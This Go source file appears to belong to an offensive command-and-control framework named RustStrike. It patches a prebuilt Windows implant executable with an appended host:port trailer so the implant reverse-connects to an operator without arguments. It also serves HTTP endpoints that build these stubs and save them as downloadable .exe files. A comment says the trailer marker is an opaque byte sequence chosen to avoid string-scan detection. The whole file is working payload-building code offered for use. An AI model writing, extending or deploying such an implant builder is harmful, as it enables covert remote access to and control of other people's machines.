package main

// Implant stub patcher: appends a config trailer to a prebuilt implant exe so
// it reverse-connects to a given host:port WITHOUT CLI args. The implant reads
// this trailer at startup (see crates/implant/src/main.rs::read_trailer_config);
// if absent it falls back to args[1]/args[2].
//
// Trailer layout (appended to the exe bytes):
//   <exe bytes>... <padding to align> <TrailerMagic> <host> "\x00" <port> "\x00"
//
// The magic + NUL-delimited fields are binary-safe. The implant reads only the
// last ~256 bytes to find it, so keep the trailer short.

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

// TrailerMagic is the marker the implant searches for near the end of its exe.
// Opaque byte sequence (not a readable word) so it isn't a string-scan
// telltale; must match crates/implant/src/main.rs::TRAILER_MAGIC.
var TrailerMagic = []byte{0x7C, 0x53, 0x9A, 0x2E, 0xD1, 0x04, 0xB8, 0x6F, 0x11, 0xA3}

// PatchImplant returns the base implant exe bytes with a host:port trailer
// appended. baseExe is the path to a prebuilt ruststrike-implant.exe.
func PatchImplant(baseExe, host, port string) ([]byte, error) {
	if host == "" || port == "" {
		return nil, errors.New("host and port required")
	}
	raw, err := os.ReadFile(baseExe)
	if err != nil {
		return nil, fmt.Errorf("read base exe %s: %w", baseExe, err)
	}
	// If the base already has a trailer (e.g. re-patching), strip it first so we
	// don't accumulate trailers.
	raw = stripTrailer(raw)
	out := make([]byte, 0, len(raw)+len(TrailerMagic)+len(host)+len(port)+4)
	out = append(out, raw...)
	out = append(out, TrailerMagic...)
	out = append(out, []byte(host)...)
	out = append(out, 0)
	out = append(out, []byte(port)...)
	out = append(out, 0)
	return out, nil
}

// stripTrailer removes a trailing trailer (if present) so an exe can be
// re-patched cleanly. Searches the last 512 bytes for the magic.
func stripTrailer(raw []byte) []byte {
	window := 512
	if len(raw) < window {
		window = len(raw)
	}
	tail := raw[len(raw)-window:]
	idx := lastIndex(tail, TrailerMagic)
	if idx < 0 {
		return raw
	}
	// truncate from the magic onward (in the full slice)
	cutAt := len(raw) - window + idx
	return raw[:cutAt]
}

// lastIndex returns the index of the first byte of needle in haystack, or -1.
func lastIndex(haystack, needle []byte) int {
	if len(needle) == 0 || len(needle) > len(haystack) {
		return -1
	}
	for i := 0; i <= len(haystack)-len(needle); i++ {
		match := true
		for j := 0; j < len(needle); j++ {
			if haystack[i+j] != needle[j] {
				match = false
				break
			}
		}
		if match {
			return i
		}
	}
	return -1
}

// resolveBaseImplantExe finds the prebuilt implant exe: RUSTSTRIKE_IMPLANT_EXE
// env var, else <exe-dir>/ruststrike-implant.exe, else a repo-relative path.
func resolveBaseImplantExe() (string, error) {
	if baseImplantExe != "" {
		if _, err := os.Stat(baseImplantExe); err == nil {
			return baseImplantExe, nil
		}
	}
	if p := os.Getenv("RUSTSTRIKE_IMPLANT_EXE"); p != "" {
		if _, err := os.Stat(p); err == nil {
			return p, nil
		}
	}
	if exe, err := os.Executable(); err == nil {
		cand := filepath.Join(filepath.Dir(exe), "ruststrike-implant.exe")
		if _, err := os.Stat(cand); err == nil {
			return cand, nil
		}
	}
	// repo-relative fallback (core runs from clients/server)
	cand := filepath.Join("..", "..", "target", "release", "ruststrike-implant.exe")
	if _, err := os.Stat(cand); err == nil {
		abs, _ := filepath.Abs(cand)
		return abs, nil
	}
	return "", errors.New("base implant exe not found (set RUSTSTRIKE_IMPLANT_EXE)")
}

// stubBuildHandler — POST /api/stub/build body {host, port} -> {exe_b64}.
func stubBuildHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Host string `json:"host"`
		Port string `json:"port"`
	}
	if err := decodeJSONBody(r, &body); err != nil {
		http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
		return
	}
	base, err := resolveBaseImplantExe()
	if err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}
	patched, err := PatchImplant(base, body.Host, body.Port)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{
		"exe_b64": base64.StdEncoding.EncodeToString(patched),
		"host":    body.Host,
		"port":    body.Port,
		"size":    fmt.Sprintf("%d", len(patched)),
	})
}

// decodeJSONBody is a small helper shared by handlers.
func decodeJSONBody(r *http.Request, v any) error {
	return json.NewDecoder(r.Body).Decode(v)
}

// repoRootFromBaseExe derives the RustStrike repo root from the base implant
// exe path (<repo>/target/release/ruststrike-implant.exe). It walks up from
// the exe's dir looking for a `Cargo.toml` marker (robust to the exe living
// elsewhere via RUSTSTRIKE_IMPLANT_EXE), falling back to three dirs up.
func repoRootFromBaseExe(baseExe string) string {
	dir := filepath.Dir(baseExe)
	for d := dir; d != "" && d != "." && d != filepath.Dir(d); d = filepath.Dir(d) {
		if _, err := os.Stat(filepath.Join(d, "Cargo.toml")); err == nil {
			return d
		}
	}
	// fallback: <repo>/target/release/<exe> -> three dirs up
	return filepath.Dir(filepath.Dir(filepath.Dir(baseExe)))
}

// safeFileName turns an operator-supplied name into something safe for a
// Windows filename (no path separators, no trailing dots/spaces).
func safeFileName(name string) string {
	if name == "" {
		name = "ruststrike-implant"
	}
	name = strings.Map(func(r rune) rune {
		if r < 32 || strings.ContainsRune(`<>:"/\|?*`, r) {
			return '_'
		}
		return r
	}, name)
	name = strings.TrimRight(name, ". ")
	return name
}

// stubSaveHandler — POST /api/stub/save body {host, port, name} -> {path, exe_b64}.
//
// Writes the patched exe to <repo>/agents/<name>.exe (so a copy lives under
// the project — gitignored via *.exe) AND returns it base64 so the operator
// GUI can trigger a browser download too. The agents/ dir is created on first
// use.
func stubSaveHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Host string `json:"host"`
		Port string `json:"port"`
		Name string `json:"name"`
	}
	if err := decodeJSONBody(r, &body); err != nil {
		http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
		return
	}
	base, err := resolveBaseImplantExe()
	if err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}
	patched, err := PatchImplant(base, body.Host, body.Port)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	agentsDir := filepath.Join(repoRootFromBaseExe(base), "agents")
	if err := os.MkdirAll(agentsDir, 0o755); err != nil {
		http.Error(w, "create agents dir: "+err.Error(), http.StatusInternalServerError)
		return
	}
	fname := safeFileName(body.Name)
	if !strings.HasSuffix(strings.ToLower(fname), ".exe") {
		fname += ".exe"
	}
	outPath := filepath.Join(agentsDir, fname)
	if err := os.WriteFile(outPath, patched, 0o644); err != nil {
		http.Error(w, "write stub: "+err.Error(), http.StatusInternalServerError)
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{
		"path":    outPath,
		"exe_b64": base64.StdEncoding.EncodeToString(patched),
		"host":    body.Host,
		"port":    body.Port,
		"size":    fmt.Sprintf("%d", len(patched)),
	})
}
